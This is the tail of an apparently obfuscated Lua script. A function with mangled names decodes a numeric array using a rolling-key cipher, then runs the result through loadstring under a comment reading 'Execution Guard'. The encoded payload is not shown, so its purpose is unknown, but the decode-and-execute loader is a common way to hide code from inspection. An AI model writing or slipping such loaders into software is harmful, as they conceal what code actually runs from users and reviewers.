    local function VM_I111l00l(d, k, m)
        local R_l1llO = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_l1llO, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_l1llO)
    end

    -- Execution Guard
    local F_l0lI0l = loadstring(VM_I111l00l(B_I01Ill, 80, 5))
    if F_l0lI0l then
        F_l0lI0l(...)
    end
end)(...)
